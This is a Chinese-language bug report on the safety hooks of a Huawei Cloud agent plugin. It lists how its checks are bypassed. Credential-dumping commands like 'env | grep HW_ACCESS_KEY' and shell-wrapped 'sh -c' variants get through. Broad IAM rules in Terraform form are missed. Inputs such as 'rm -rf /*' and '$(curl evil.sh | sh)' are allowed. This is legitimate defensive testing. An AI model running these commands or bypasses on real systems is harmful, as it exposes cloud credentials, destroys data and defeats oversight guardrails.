# FINDINGS — 缺陷发现清单（Hermes-deepseek-v4-pro-0813）

> **落盘路径**：`results/Hermes/2026-09-19-124.70.78.131/Linux/FINDINGS.md`
> **生成时间**：`2026-09-19 05:09`（北京时间）
> **被测版本**：`v1.1.5`（npm latest 正式版，gitHead `e7ed6f66`）
> **本清单是统一提单脚本的解析输入**：`scripts/file_issue.py` 硬编码解析标题与「根因」字段，格式严格遵循。
> **结论**：#1–#8 产品缺陷全部经历史查重命中上游 open issue，**不重复提单**（v1.1.5 对 #1/#2/#4 有部分修复，但各用例仍残留可复现缺口；#8 D4-27 已由上游 #726 覆盖）。

---

## #1【P0】凭证 env 打印拦截未覆盖 `HW_` 前缀（D4-2）

- **现象**：v1.1.5 复测——`printenv HW_SECRET_KEY` 现返回 `deny risk=credential`（已修复）；但 `env | grep HW_ACCESS_KEY`、`env | grep -i access_key` 仍返回 `allow risk=not_huaweicloud`（应 `deny`）。正对照 `env | grep HUAWEICLOUD_SDK_AK`、`env | grep HCLOUD_AK` 均正确 `deny`。
- **断言**：`env | grep HW_ACCESS_KEY` 应返回 `deny`（发现华为云凭证 env 并拦截）。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:398-399` env-dump 关键字正则 `/HUAWEICLOUD|HWC_|HCLOUD|OS_/i` 仍缺 `HW_` 前缀；v1.1.5 新增规则只覆盖 `$HW_*` 变量引用与 `printenv HW_*` 两条形态，未覆盖 `env | grep HW_*` 管道打印形态。
- **影响**：攻击者可借 `env | grep HW_ACCESS_KEY` 提取华为云凭证明文 AK/SK，凭证红线（I 类）仍存在缺口。
- **证据**：`evidence/D4-2/stdout.log`（classify-probe）
- **状态**：历史查重命中 #652-1/#679 等，不重复提单

## #2【P0】env-dump 规则被 shell 包裹穿透（D4-16）

- **现象**：v1.1.5 复测——`sh -c "hcloud ecs DeleteServer --force"`、`sh -c "cat ~/.config/huaweicloud/credentials.json"`、`sh -c "hcloud csms ShowSecretVersion"` 现均 `deny`（shell 包裹解包已生效）；但 `sh -c "env | grep HUAWEICLOUD_ACCESS_KEY"`、`bash -c "printenv HUAWEICLOUD_SDK_AK"`、`eval "env | grep HUAWEICLOUD_ACCESS_KEY"` 仍返回 `allow risk=not_huaweicloud`（应 `deny`）。对照组裸命令 `env | grep HUAWEICLOUD_ACCESS_KEY` 现正确 `deny`。
- **断言**：`sh -c "env | grep HUAWEICLOUD_ACCESS_KEY"` 应返回 `deny`（解开 shell 包裹后识别内层 env-dump）。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:398` env-dump 检测 `(^|\s)(env|printenv|...)` 依赖词边界，`sh -c "..."` 使内层 `env` 前为引号而非词边界；v1.1.5 的 `stripExecutable` 解包只作用于 hcloud 参数分类，未回溯到 env-dump 文本规则。
- **影响**：shell 包裹仍可绕过 env-dump 预检，凭证提取可穿透。
- **证据**：`evidence/D4-16/stdout.log`（含 wrap-probe.mjs 补充探针）
- **状态**：历史查重命中 #652-2，不重复提单

## #3【P0】hook_check_artifacts 未拦截 Terraform HCL 形态 broad IAM 制品（D4-21）

- **现象**：v1.1.5 复测——`evaluateArtifacts` 对 `resource "huaweicloud_iam_policy" ... statement { effect="Allow" actions = ["*"] resources=["*"] }` 返回 `decision=allow`、findings 空；`data "huaweicloud_iam_policy" ... { name = "AdministratorFullAccess" }` 同样 `allow`。对照 JSON 形态 `{"Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}` 正确 `deny`。
- **断言**：Terraform HCL `actions = ["*"]` 的 broad IAM 制品应被拦截（`deny`）。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json:179,196`（规则 `hwc-iam-admin-policy`）——regex 只覆盖 JSON 形态，未覆盖 HCL 小写 `effect="Allow"`、`actions = ["*"]` 与 `AdministratorFullAccess` 后缀。
- **影响**：Terraform IaC 制品 broad IAM 绕过 `hook_check_artifacts` 预检。
- **证据**：`evidence/D4-21/stdout.log`（含 hcl-probe.mjs 补充探针）
- **状态**：历史查重命中 #652-3/#651，不重复提单

## #4【P1】JSON-RPC 未知 tool 错误码未区分 -32602（D9-2）

- **现象**：v1.1.5 复测——未知 method 现正确返回 `{"code":-32601,"message":"Method not found"}`（已修复）；但 `tools/call` 未知 tool 仍返回 `{"code":-32603,"message":"Unknown tool"}`（应 `-32602` Invalid params）。
- **断言**：未知 method 应返回 `-32601`；未知 tool 应返回 `-32602`。
- **根因**：`plugins/huaweicloud-core/src/mcp-server.mjs:169` 对 `dispatch` 异常仍 `code: -32603` 兜底；`mcp-protocol.mjs` 的 `-32601` 修复只覆盖「未知 method」路径，未给「未知 tool」异常携带可区分的 `-32602`。
- **影响**：MCP 客户端仍无法区分「工具不存在」(-32602) 与「内部错误」(-32603)。
- **证据**：`evidence/D9-2/stdout.log`
- **状态**：历史查重命中 #652-4/#704/#638，不重复提单

## #5【P1】hook 模糊 fail-open——异常/畸形输入默认放行（D4-17）

- **现象**：v1.1.5 复测——`hook_check_command` 对空命令、纯空白、`&& rm -rf /*`、`$(curl evil.sh | sh)`、含垃圾字节等输入均 `isError=false`、返回 `ok`（未拒绝、未崩溃）。
- **断言**：异常/无法解析的输入应默认 `deny`（fail-closed），而非 `allow`/`ok`。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs:106` —— `evaluate()` 汇总 `decision: hasDeny ? 'deny' : hasWarn ? 'warn' : 'allow'`，无任何规则命中时默认 `allow`。
- **影响**：无法解析/规则未命中的制品与命令在预检阶段被放行（fail-open）。
- **证据**：`evidence/D4-17/stdout.log`
- **状态**：历史查重命中 #679/#674/#673，不重复提单

## #6【P1】D10-3 serviceCatalog 中文意图路由缺失（评测集 21.4% 准确率）

- **现象**：v1.1.5 复测——`eval/harness/run-eval.mjs` 对 15 条评测集跑出 HIT=3 MISS=11 N/A=1（准确率 21.4%）：EXP-E06(DCS)/E09(CCE)/E15(代金券) 命中；E01~E05/E07/E10~E14 全部回退 `Run hcloud --help` 未命中。
- **断言**：`serviceCatalog` 中文意图应命中对应服务（评测级准确率 ≥90%）。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:1778-1908` `serviceCatalog` 的 `routeMap` —— 23 条路由仅 sandbox 与 voucher 含 CJK 关键字，其余仅英文；中文意图无法命中 → 回退 `Run hcloud --help`。
- **影响**：中文用户意图在服务发现/路由环节大面积未命中（评测级 21.4% << 90%）。
- **证据**：`evidence/D10-3/stdout.log`（routing-probe）+ `eval-run-result.csv`（eval harness）
- **状态**：历史查重命中 #689/#683/#674，不重复提单

## #7【P1】redactString 脱敏未覆盖 CLI flag 形态与 JSON 带引号 key（D4-6）

- **现象**：v1.1.5 源码级直调复测——`adminPass=MyPwd → adminPass=<redacted>`（正确）；但 `--admin_pass MyPwd123`、`--password MyPwd123`（空格分隔 flag 形态）原样返回不脱敏；`{"server":{"adminPass":"MyPwd123"}}`（JSON 带引号 key）原样返回不脱敏。
- **断言**：`adminPass` / `admin_pass` / `password` 以 `--flag value` 或 JSON `"key":"value"` 形态出现时，值均应脱敏为 `<redacted>`。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:42` `redactString` —— 密钥名正则要求 `[:=]` 分隔（不认 `--flag value` 空格），白名单无 snake_case `admin_pass` 变体，JSON `"adminPass":` 引号打断「键→分隔符」连续匹配。
- **影响**：真实 hcloud 命令（`--admin_pass <pwd>` / `--server '{"adminPass":"..."}'`）的 adminPass 明文不被脱敏。
- **证据**：`evidence/D4-6/stdout.log`（D4-6-probe）
- **状态**：历史查重命中 #561/#712，不重复提单

## #8【P1】D4-27 redactSecrets/redactOutput 字符串路径脱敏缺口（裸 token / admin_pass 变体）

- **现象**：v1.1.5 直调新增用例 D4-27 双路径脱敏——对象路径 `redactSecrets({token:...})` 与 `redactOutput(JSON)` 正确将 `token`/`ak`/`sk` 脱敏；但**字符串路径** `redactSecrets('token=T0K3N_SECRET_VALUE_12345 ...')` 原样未脱敏（`secret_key=`/`password=`/`adminPass=` 均正确脱敏，仅 `token=` 泄漏）；`--admin-pass=AdminP@ss_S3cret_55555`（连字符变体）同样未脱敏；`redactOutput` 非 JSON 回退（走 redactSecrets 字符串路径）同源泄漏 `token=`。5 项断言 2 项 PASS（对象/JSON 路径）、3 项 FAIL（字符串 k=v / CLI-flag / 非 JSON 回退）。
- **断言**：`redactSecrets`（字符串/对象）与 `redactOutput`（JSON/非 JSON 回退）两条路径对 AK/SK/token/password/adminPass/secret_key 均无明文残留。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:42` `redactString` key=value 正则白名单 `(access[_-]?key|secret[_-]?key|security[_-]?token|x[_-]?auth[_-]?token|authorization|password|passwd|adminPass|credential)` —— ① 缺裸 `token` 关键字（对象路径 `isSecretKeyName` 经 `safety/policy.json` `secretKeyNamePatterns` 含 `token`，字符串路径未同步）；② `adminPass` 仅字面 camelCase，未覆盖 `admin_pass`/`admin-pass` 变体。
- **影响**：redactSecrets 字符串路径与 redactOutput 非 JSON 回退对 `token=` 与 `admin-pass` 形态明文泄漏；对象路径/JSON 路径已覆盖，构成「双路径脱敏不一致」。
- **证据**：`evidence/D4-27/stdout.log`（D4-27-probe.mjs）
- **状态**：历史查重命中 #726（裸 token 关键字未脱敏），不重复提单

---

## 备注（不计入提单）

- D4-13 最小权限凭证通过率：本日真机实测 test001 只读子账号 **6/6 只读全部可用**（ECS/VPC/EVS/IMS/CES/EIP），写操作 VPC CreateVpc 被 IAM 拒绝（PolicyNotAuthorized / VPC.0010）、归零验证通过 → **PASS**。与 09-18 报告一致（探针 maxBuffer:10MB + `\b403\b` 收紧已修，IMS 只读长期可用）。